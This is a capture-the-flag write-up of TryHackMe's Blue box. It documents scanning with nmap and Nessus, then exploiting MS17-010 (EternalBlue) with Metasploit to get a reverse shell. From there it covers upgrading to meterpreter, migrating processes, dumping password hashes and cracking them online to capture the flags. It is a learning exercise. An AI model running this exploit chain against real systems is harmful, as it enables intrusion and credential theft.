## TryHackMe - (Eternal)Blue Methodology
> Completed 18th March 2022, Revisited 12th May 2022.

This is the attack methodology I used for TryHackMe's Blue box.
This box is a step back from Blueprint in terms of objective progression, however I found it to be a good lesson in fundamentals.

>Edit: On my second attempt at this box I wanted to find the vulnerability via nmap.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nessus
- Metasploit.

---
### Methodology
#### Objectives/Flags
1. Flag1, This flag can be found at the system root.
2. Flag2, This flag can be found at the location where passwords are stored within Windows.
3. Flag3, this flag can be found in an excellent location to loot.

---
#### Reconnaissance
First I started by running an nmap scan on the target. It was disclosed that ICMP was not going to work so I added in the extra `-Pn` into the options.
```bash
nmap -T4 -Pn <TargetIP>
```
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
```
With this portscan I can see that there are several Windows services running on open ports. I figured this was a great time to employ a vulnerability scanner to see what more I could find.
I decided to try Nessus which is a well known vuln. scanner. Once downloading the installation file to my machine and registering for a license...
```bash
sudo apt install -f ./<Nessus.deb>
  service nessusd start
     https://kali:8834/
```
Once Nessus was up and running I set the Target and set it loose. A number of vulnerabilities were flagged and one stood out the most which I took to be relevant to the box.
```
port445 	MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)
```

![](/TryHackMe/Blue(Eternal)/images/Blue_001.jpg)

>Edit: Another way this could have been discovered is through the use of nmap's script engine `nmap -T4 -Pn <Target-IP> --script=default,vuln`

![](/TryHackMe/Blue(Eternal)/images/Blue_002.jpg)

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
The box walkthrough mentioned that it was time to use Metasploit which I've never used before. This required a bit of crash-coursing on google to understand the basic usage and commands. After booting it up I searched for the vulnerability code `ms17-010` and designated the local and remote hosts. I had additionally specified the port that was reported through Nessus but I don't know if this was needed.
```bash
metasploit
  search ms17-010
    exploit/windows/smb/ms17_010_eternalblue
      use [0] (exploit/windows/smb/ms17_010_eternalblue)
      set rhost <TargetIP>
      set lhost <LocalIP>
      set lport 445
```
The following option was reccomended by the box's objective guide and I do not have a clear idea of what is does.
```bash
      set payload windows/x64/shell/reverse_tcp 
      run
```
Success, I've now got shell access to the host. From here I was ready to start going for the flags, however the box's objective guide would walk me through upgrading the type of shell access I had to the machine. First, I used ```Ctrl-Z``` to background the process and then worked to upgrade the session.
While still under the ms17-010 exploit I searched for the upgrade.
```bash
search shell_to_meterpreter
  use post/multi/manage/shell_to_meterpreter
sessions -l (used to display current sessions)
  set sessions 1
  run
```
A new session should spawn which I opened with `sessions 2`.

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
From here I verified the identity.
```bash
getsystem
  Already running as SYSTEM
getuid
    NT AUTHORITY\SYSTEM 
```
An interesting step which the box's objective walkthrough made me take was to migrate the process ID (PID). I didn't know this was possible but was interesting to try. I used ```PS``` to display the processes running on the machine and was tasked to find a process which was under ```NT AUTHORITY\SYSTEM```. This had failed a few times and even crashed the session. I was not surprised by this as it was explained the migrate command was unstable.
The process that I went with:
```
692   596   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
```
```bash
ps 
  migrate 692
```

![](/TryHackMe/Blue(Eternal)/images/Blue_003.jpg)

According to the walkthrough Metasploit can immediately dump the Windows machine's hashes. This was so much more convenient than my attempts at extracting hashes in the Blueprint box. Instead of messing around with Hashcat however, I went straight to crackstation.
```
hashdump
  Administrator:500:<Hash>:<Hash>:::
  Guest:501:<Hash>:<Hash>:::
  Jon:1000:<Hash>:<Hash>:::
    https://crackstation.net/
      Insert <hash> -> crack
        <password>
```

After this was successful, I got to work on the flags. Considering the descriptions on their locations and my interaction with the previous box (Blueprint) I knew where these were going to be.
```
Navigated to C:\
  flag1.txt
    cat flag1.txt
		
Listing: C:\Windows\system32\config
  flag2.txt
    cat flag2.txt

Listing: C:\Users\jon\Documents
  flag3.txt
    cat flag3.txt
  ```
---
### After-action
#### What I've learned
I really enjoyed this box as I got to explore some more powerful industry tools. Fortunately, I've had experience with vulnerability scanners in the past so Nessus was really straight forward and familiar to use, navigate and understand. Metasploit, however was something I had never really used before but have heard so much about so getting my hands on with an objective was fantastic. I will definitely look to leverage its power in future exercises.

#### What I would've done differently
I would've liked to use screenshots to go along with these blog entries however the administration behind it would probably do my head in. I would however be looking into options of screen-recoding for my own sake of documentation and will allow me to better reflect on my steps.

>Edit: I am happy with my second attempt at this box. I still have some confusion as to why we close the [0] options when searching for ms17-010 exploits.